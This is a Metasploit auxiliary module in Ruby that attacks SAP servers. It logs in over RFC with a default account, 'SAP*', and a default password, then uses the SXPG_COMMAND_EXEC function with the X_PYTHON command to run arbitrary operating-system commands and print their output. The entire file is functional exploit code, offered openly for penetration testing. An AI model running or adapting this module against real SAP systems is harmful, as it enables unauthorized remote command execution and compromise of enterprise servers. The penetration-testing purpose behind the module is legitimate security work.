##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

##
# This module is based on, inspired by, or is a port of a plugin
# available in the Onapsis Bizploit Opensource ERP Penetration Testing
# framework - http://www.onapsis.com/research-free-solutions.php.
# Mariano Nunez (the author of the Bizploit framework) helped me in my
# efforts in producing the Metasploit modules and was happy to share his
# knowledge and experience - a very cool guy.
#
# The following guys from ERP-SCAN deserve credit for their
# contributions Alexandr Polyakov, Alexey Sintsov, Alexey Tyurin, Dmitry
# Chastukhin and Dmitry Evdokimov.
#
# I'd also like to thank Chris John Riley, Ian de Villiers and Joris van
# de Vis who have Beta tested the modules and provided excellent
# feedback. Some people just seem to enjoy hacking SAP :)
##

require 'msf/core'
require 'msf/core/exploit/sap'

class Metasploit4 < Msf::Auxiliary

  include Msf::Exploit::SAP::RFC
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name' => 'SAP RFC X_PYTHON SXPG_COMMAND_EXEC',
      'Description' => %q{
        This module makes use of the SXPG_COMMAND_EXEC Remote Function Call to execute OS commands as configured in SM69.
        It uses the X_PYTHON library to execute the command and returns the call output plus the exit code.
        The module requires the NW RFC SDK from SAP as well as the Ruby wrapper nwrfc (http://rubygems.org/gems/nwrfc).
      },
      'References' => [[ 'URL', 'https://labs.mwrinfosecurity.com/' ]],
      'Author' => [ 'Ben Campbell', 'nmonkee' ],
      'License' => MSF_LICENSE,
    )

    register_options(
      [
        OptString.new('USERNAME', [true, 'Username', 'SAP*']),
        OptString.new('PASSWORD', [true, 'Password', '06071992']),
        OptString.new('CMD', [true, 'Command', 'id']),
      ], self.class)
  end

  def run_host(rhost)
    res = nil
    user = datastore['USERNAME']
    password = datastore['PASSWORD']
    unless datastore['CLIENT'] =~ /^\d{3}\z/
        fail_with(Exploit::Failure::BadConfig, "CLIENT in wrong format")
    end

    cmd = encode_command_python(datastore['CMD'])
    exec = encode_python(cmd)

    if exec.length > 255
      # do python stager to file like exploit if needed
      print_error("#{rhost}:#{rport} [SAP] Encoded command length must not exceed 255 characters - #{exec.length}")
    else
      opts = {
        :OPERATINGSYSTEM => 'ANYOS',
        :COMMANDNAME => 'X_PYTHON',
        :ADDITIONAL_PARAMETERS => exec
      }

      login(rhost, rport, client, user, password) do |conn|
        res = sxpg_command_execute(conn, opts)
      end
    end

    if res
      print_line res
    else
      print_error("#{rhost}:#{rport} [SAP] No response from cmd '#{datastore['CMD']}'")
    end
  end

end

